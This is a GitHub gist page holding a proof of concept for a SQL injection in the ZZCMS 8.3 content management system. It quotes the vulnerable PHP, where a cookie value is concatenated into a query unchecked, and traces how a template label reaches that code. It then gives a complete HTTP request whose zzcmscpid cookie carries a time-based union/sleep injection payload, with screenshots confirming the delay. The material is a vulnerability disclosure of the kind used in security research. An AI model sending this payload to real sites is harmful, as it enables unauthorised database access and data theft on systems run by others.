=== Content from gist.github.com_7ae942a7_20250121_000104.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FLz1y%2F31595b060cd6a031896fdf2b3a1273f5)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FLz1y%2F31595b060cd6a031896fdf2b3a1273f5&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FLz1y%2F31595b060cd6a031896fdf2b3a1273f5) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FLz1y%2F31595b060cd6a031896fdf2b3a1273f5&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@Lz1y](https://avatars.githubusercontent.com/u/23468993?s=64&v=4)](/Lz1y)

# [Lz1y](/Lz1y)/**[ZZCMS sqlinject.md](/Lz1y/31595b060cd6a031896fdf2b3a1273f5)** Secret

Created
August 24, 2018 12:13

Show Gist options

* [Download ZIP](/Lz1y/31595b060cd6a031896fdf2b3a1273f5/archive/6041921761fa7b11a33ace509e296ee1c9835456.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FLz1y%2F31595b060cd6a031896fdf2b3a1273f5)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FLz1y%2F31595b060cd6a031896fdf2b3a1273f5)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/Lz1y/31595b060cd6a031896fdf2b3a1273f5.js&quot;&gt;&lt;/script&gt;
* Save Lz1y/31595b060cd6a031896fdf2b3a1273f5 to your computer and use it in GitHub Desktop.

[Code](/Lz1y/31595b060cd6a031896fdf2b3a1273f5)
[Revisions
1](/Lz1y/31595b060cd6a031896fdf2b3a1273f5/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/Lz1y/31595b060cd6a031896fdf2b3a1273f5.js&quot;&gt;&lt;/script&gt;

Save Lz1y/31595b060cd6a031896fdf2b3a1273f5 to your computer and use it in GitHub Desktop.

[Download ZIP](/Lz1y/31595b060cd6a031896fdf2b3a1273f5/archive/6041921761fa7b11a33ace509e296ee1c9835456.zip)

ZZCMS sqlinject

 [Raw](/Lz1y/31595b060cd6a031896fdf2b3a1273f5/raw/6041921761fa7b11a33ace509e296ee1c9835456/ZZCMS%2520sqlinject.md)

[**ZZCMS sqlinject.md**](#file-zzcms-sqlinject-md)

## ZZCMS sqlinject

## PoC by Lz1y

#### ZZCMS the lastest version download page :

<http://www.zzcms.net/about/6.htm>

#### zip installer:

<http://www.zzcms.net/download/zzcms8.3.zip>

### vulnerability code:

in file `zs/subzs.php line 1-24`:

```
function showcookiezs($cs){
$str="";
$cs=explode(",",$cs); //传入的$cs是一个整体字符串,转成数组
$column=isset($cs[0])?$cs[0]:3;
$imgwidth=isset($cs[1])?$cs[1]:80;
$imgheight=isset($cs[2])?$cs[2]:80;
$title_num=isset($cs[3])?$cs[3]:6;
if (!isset($_COOKIE["zzcmscpid"])){
$str="暂无记录";
}else{
$cpid=$_COOKIE["zzcmscpid"];
if (strpos($cpid,",")>0){
$cpid=str_replace(" ","",$cpid);
$cpid=str_replace("deleted","",$cpid);//cookie会出现deleted的情况
$sql="select id,proname,img from zzcms_main where id in (".$cpid.")";
}else{
checkid($cpid);
$sql="select id,proname,img from zzcms_main where id='$cpid' ";
}
...
```

in file `labels.php line 57-73`,function `fixed`:

```
function fixed($cs,$channel){
switch ($channel){
case 'ad':return showad($cs); break;
case 'zs':return showzs($cs); break;
case 'dl':return showdl($cs); break;
case 'pp':return showpp($cs); break;
case 'job':return showjob($cs); break;
case 'zx':return showzx($cs); break;
case 'zh':return showzh($cs); break;
case 'announce':return showannounce($cs); break;
case 'cookiezs':return showcookiezs($cs); break;
case 'zsclass':return showzsclass($cs); break;
case 'keyword':return showkeyword($cs); break;
case 'province':return showprovince($cs); break;
case 'sitecount':return showsitecount($cs); break;
}
}
...
```

in file `labels.php line 1-16`:

```
<?php
//产品版
function showlabel($str){
global $b;//zsshow需要从zs/class.php获取$b；zxshow从s/class.php获取$b；
//checkver($str);
//固定标签
$channels=array('ad','zs','dl','zx','pp','job','zh','announce','cookiezs','zsclass','keyword','province','sitecount');
foreach ($channels as $value) {
if (strpos($str,"{#show".$value.":")!==false){
$n=count(explode("{#show".$value.":",$str));//循环之前取值
for ($i=1;$i<$n;$i++){
$cs=strbetween($str,"{#show".$value.":","}");
if ($cs<>''){$str=str_replace("{#show".$value.":".$cs."}",fixed($cs,$value),$str);} //$cs直接做为一个整体字符串参数传入，调用时再转成数组遍历每项值
}
}}
```

in file `zs/zs.php line 342`:

```
$strout=showlabel($strout);
```

line 204-207:

```
$fp="../template/".$siteskin."/zs.htm";
$f = fopen($fp,'r');
$strout = fread($f,filesize($fp));
fclose($f);
```

in file `template/red13/zs.htm`:

```
<div class="content1">{#showcookiezs:3,60,60}</div>

```
#### POC:

```
GET /zs/zs.php HTTP/1.1
Host: lzy.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: UserName=admin; zzcmscpid=1)%0aunion%0aselect%0asleep(0),2,3#,12); PHPSESSID=82cd4ed33d175f6a22d2ceeaf7f10e93;
Connection: close
```

#### sleep(0)

[![](https://camo.githubusercontent.com/b2b4eb51e320b3e9e8074e0cbfa397d00ef7fb23aa4a700bdca235578667555f/687474703a2f2f6f6f6a7a6f33336d692e626b742e636c6f7564646e2e636f6d2f31382d382d32342f35343438363035382e6a7067)](https://camo.githubusercontent.com/b2b4eb51e320b3e9e8074e0cbfa397d00ef7fb23aa4a700bdca235578667555f/687474703a2f2f6f6f6a7a6f33336d692e626b742e636c6f7564646e2e636f6d2f31382d382d32342f35343438363035382e6a7067)

#### sleep(5)

[![](https://camo.githubusercontent.com/860bf1e59c54c921e5ddcbb5316d0650547a0cce054b2e427444ee035144feb5/687474703a2f2f6f6f6a7a6f33336d692e626b742e636c6f7564646e2e636f6d2f31382d382d32342f37313838343037392e6a7067)](https://camo.githubusercontent.com/860bf1e59c54c921e5ddcbb5316d0650547a0cce054b2e427444ee035144feb5/687474703a2f2f6f6f6a7a6f33336d692e626b742e636c6f7564646e2e636f6d2f31382d382d32342f37313838343037392e6a7067)

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FLz1y%2F31595b060cd6a031896fdf2b3a1273f5)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


